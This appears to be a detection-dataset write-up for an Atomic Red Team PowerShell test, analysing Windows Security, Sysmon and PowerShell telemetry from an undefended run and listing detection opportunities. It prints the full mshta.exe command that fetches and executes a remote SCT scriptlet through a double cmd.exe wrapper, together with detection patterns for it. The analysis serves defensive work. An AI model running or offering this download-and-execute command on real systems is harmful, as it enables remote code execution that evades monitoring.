# T1059.001-8: PowerShell — PowerShell Invoke mshta.exe Download

## Technique Context

T1059.001 (PowerShell) drives the execution of mshta.exe with a JavaScript payload. Mshta.exe is the Microsoft HTML Application host — a signed Windows binary that can execute JScript and VBScript, making it a classic "living off the land" proxy for payload execution. The JavaScript payload in this test uses `GetObject('script:https://...')` to fetch and execute a remote Component Object Model (SCT) scriptlet file, which is a technique popularized as "Squiblytwo" or in variations of the LOLBAS execution chain.

The full command:
```
"cmd.exe" /c C:\Windows\system32\cmd.exe /c "mshta.exe javascript:a=GetObject(
'script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct')
.Exec();close()"
```

The nesting here is notable: PowerShell spawns `cmd.exe /c`, which spawns another `cmd.exe /c`, which spawns `mshta.exe` with the JavaScript payload. This double-cmd wrapping creates an extra process layer between PowerShell and mshta.exe, complicating process lineage monitoring that looks for `powershell.exe → mshta.exe` directly.

The `.sct` file is a Windows Script Component — an XML-based container that can hold JScript or VBScript. Fetching an SCT via `GetObject('script:...')` causes mshta.exe to download and execute the remote script without writing it to disk. Detection focuses on: mshta.exe command lines containing `javascript:`, `vbscript:`, or `GetObject('script:...')` patterns; network connections from mshta.exe to external domains; and the `powershell → cmd → mshta` process chain.

In defended environments, `STATUS_ACCESS_DENIED` (0xC0000022) terminates cmd.exe before mshta.exe launches. This dataset captures the undefended execution.

## What This Dataset Contains

Security EID 4688 captures four process creations. The key event records `cmd.exe` (PID 0x1828 approximately, parent powershell.exe) with the full mshta.exe command:

```
"cmd.exe" /c C:\Windows\system32\cmd.exe /c "mshta.exe javascript:a=GetObject(
'script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/
atomics/T1059.001/src/mshta.sct').Exec();close()"
```

Two `whoami.exe` processes from PowerShell are captured, and a second `cmd.exe` with an empty command line (`"cmd.exe" /c`) appears — likely the cleanup phase running a no-op.

The PowerShell channel has 96 events (93 EID 4104, 2 EID 4100, 1 EID 4103). The 93 4104 blocks include the test framework overhead and the mshta invocation script.

Sysmon provides 16 events across EIDs 7, 10, 1, 17, and 8. EID 1 captures `whoami.exe` (PID 4984) and a second `whoami.exe` (PID 1292). EID 8 shows PowerShell (PID 5680) creating a remote thread in an unknown process (PID 2460, `TargetImage: <unknown process>`, `StartAddress: 0x00007FF7F015F8F0`). EID 10 captures three process access events: PowerShell (PID 5680) opening `whoami.exe` (PID 4984), `whoami.exe` (PID 1292), and `cmd.exe` (PID 6984) — all with `GrantedAccess: 0x1FFFFF`. The `cmd.exe` access event (target PID 6984) is distinct from the other tests in this series where EID 10 targets were only `whoami.exe` or `powershell.exe` — this is consistent with PowerShell monitoring its own spawned cmd.exe.

Compared to the defended version (25 sysmon, 9 security, 41 powershell events, 0xC0000022 exit on cmd.exe), the undefended version has 16 sysmon, 4 security, 96 powershell events. The defended version recorded a 4689 exit event with the access-denied status; this version does not show the mshta.exe launch either, suggesting the mshta process may have been filtered from Sysmon capture or the double-cmd wrapping caused the inner cmd.exe to not be recorded.

## What This Dataset Does Not Contain

No Sysmon EID 1 event for `mshta.exe` — the actual execution target is not recorded in process creation telemetry. This is a significant gap: the defining behavior of the technique (mshta.exe downloading and executing a remote SCT) is not directly visible. No EID 3 network connection events from mshta.exe. No DNS events for `raw.githubusercontent.com`. No Sysmon EID 1 for either of the nested `cmd.exe` processes in the double-wrapping chain.

The dataset documents the PowerShell command and the outer cmd.exe (via EID 4688) but not the actual mshta.exe execution or its network activity.

## Assessment

This dataset is most valuable for the EID 4688 command line, which contains the complete mshta.exe invocation including the `javascript:` payload and the SCT URL. The double-cmd wrapping pattern (`cmd.exe /c cmd.exe /c mshta.exe`) is a specific detection signal. The Sysmon EID 10 event showing PowerShell accessing `cmd.exe` with full rights adds behavioral context.

The absence of mshta.exe in sysmon process creation is a notable coverage gap for this technique. Detection rules that rely on Sysmon EID 1 for mshta.exe would not fire on this telemetry. The EID 4688 path to cmd.exe is the primary capture point.

## Detection Opportunities Present in This Data

1. EID 4688 `CommandLine` containing `mshta.exe javascript:a=GetObject('script:https://` — the core mshta.exe JavaScript download-and-execute pattern in a processCreate event.
2. EID 4688 with nested `cmd.exe /c` wrapping around the mshta invocation — double-cmd wrapping as a process-chain obfuscation technique.
3. EID 4688 URL `raw.githubusercontent.com/redcanaryco/atomic-red-team/` — the ART SCT file URL; in real operations substitute with attacker-controlled infrastructure.
4. Sysmon EID 10 from `powershell.exe` to `cmd.exe` with `GrantedAccess: 0x1FFFFF` — full-access handle on a spawned cmd.exe from PowerShell, indicating the parent process is monitoring or controlling the child.
5. Sysmon EID 8 from `powershell.exe` to `<unknown process>` — CreateRemoteThread with unresolved target, consistent across this PowerShell test series.
6. EID 4688 process chain: `powershell.exe → cmd.exe → (nested cmd) → mshta.exe` — the intermediate cmd.exe layers between PowerShell and mshta are a distinct pattern from direct `powershell → mshta` execution.
7. EID 4688 `CommandLine` containing `.Exec();close()` — the standard pattern for SCT-based mshta execution where the result of `GetObject` is immediately called with `.Exec()`.
